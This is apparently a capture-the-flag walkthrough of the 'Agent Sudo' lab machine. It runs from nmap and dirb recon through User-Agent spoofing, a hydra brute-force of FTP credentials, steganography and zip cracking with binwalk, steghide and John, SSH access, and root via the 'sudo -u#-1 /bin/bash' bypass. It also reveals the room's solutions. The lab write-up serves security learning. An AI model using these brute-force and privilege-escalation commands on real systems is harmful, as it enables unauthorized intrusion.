# Agent Sudo

We'll start with our default nmap scan.

`nmap -sV -sC -O 10.10.15.235`

```21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
```


We'll check out the website first. It's very basic and the only info it gives us is:

> Dear agents,

> Use your own codename as user-agent to access the site.

> From,
> Agent R 

Let's run dirb against the site and see if there's any hidden pages.

`dirb http://10.10.15.235 /usr/share/wordlists/dirb/common.txt`

The dirb scan tells us the website is using php.

> ---- Scanning URL: http://10.10.15.235/ ----
> + http://10.10.15.235/index.php (CODE:200|SIZE:218)  

Let's run dirb again but this time with the `-X .php` option


`dirb http://10.10.15.235 /usr/share/wordlists/dirb/common.txt -X .php`

No hits.

Let's try and log into that FTP server we found earlier and see if there's anything interesting.

Well, we can't login anonymously. We need to find a username and password.

Going back to the website, it says "Use your own **codename** as user-agent to access the site...

Ok so let's try modifying our initial request with the help of Burp. The box is called Sudo, so I tried replacing the content of user-agent: with `Agent Sudo` (based on the boxes name) but that didn't seem to do anything. Taking a look at the hint it says we should try using `user-agent: C`. 

Once we modified the request we're redirected to http://10.10.15.235/agent_C_attention.php which tells us:

> Attention chris,

> Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

> From,
> Agent R 

We can assume we have a username now (chris) which we'll use to try and access the FTP service. We still need the password, so let's use hydra to try and brute-force it.

```hydra -v -l chris -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt ftp://10.10.15.235:21```

Nice, we found the password `crystal`

Let's login to the ftp server now.

In the root directory, there are 3 files.

> -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
> -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
> -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

Let's transfer the .txt file to our machine.

`get To_agentJ.txt`

It says:

> Dear agent J,

> All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It > shouldn't be a problem for you.

> From,
> Agent C

Let's transfer the rest of the files to our attack box since it looks like we'll need to do some steganography.

`steghide extract -sf cute-alien.jpg`

We need a passphrase, which according to the note is stored in the fake picture. We'll use binwalk to solve this.

`binwalk cutie.png -e`

Let's unzip the file that was extracted.

It's password protected. Let's use John The Ripper here to try and crack the file.

`zip2john 8702.zip > crackme`

and then `John crackme` gives us the password.

We'll unzip the file now with 7zip.

`7z x 8702.zip`

Now let's check out the contents of "To_agentR.txt"

> Agent C,

> We need to send the picture to 'QXJlYTUx' as soon as possible!

> By,
> Agent R

`QXJlYTUx` appears to be a base64 encoded string.

We'll decode it and use the decoded string to extract the files in cute-alien.jpg

`steghide -sf cute-alien.jpg`

And now we have a "message.txt" file we can read.

`cat message.txt`

Nice, we have an SSH password now for `james`

`ssh james@10.10.15.235`

We'll quickly grab the user flag from the home directory, and work on the next question.

> What is the incident of the photo called?

The hint says to use "Reverse Image search and Foxnews" so let's go ahead and to that.

Copy the file to our attackbox first.

`scp james@10.10.15.235:Alien_autospy.jpg .`

And let's use https://tineye.com/ to look the image up.

The title of the news article contains the answer to the question.

Now time for privesc...

`sudo -l` to check our sudo privileges

> User james may run the following commands on agent-sudo:
>    (ALL, !root) /bin/bash

So we can't run /bin/bash as root, but a little googling tells us there's an exploit available for this.

`sudo -u#-1 /bin/bash`

And now we have root.

We'll grab the root flag from the root directory, and work on the bonus question.

> (Bonus) Who is Agent R?

Well, the contents of root.txt end with

> By,
> DesKel a.k.a Agent R

Boom. Room complete.


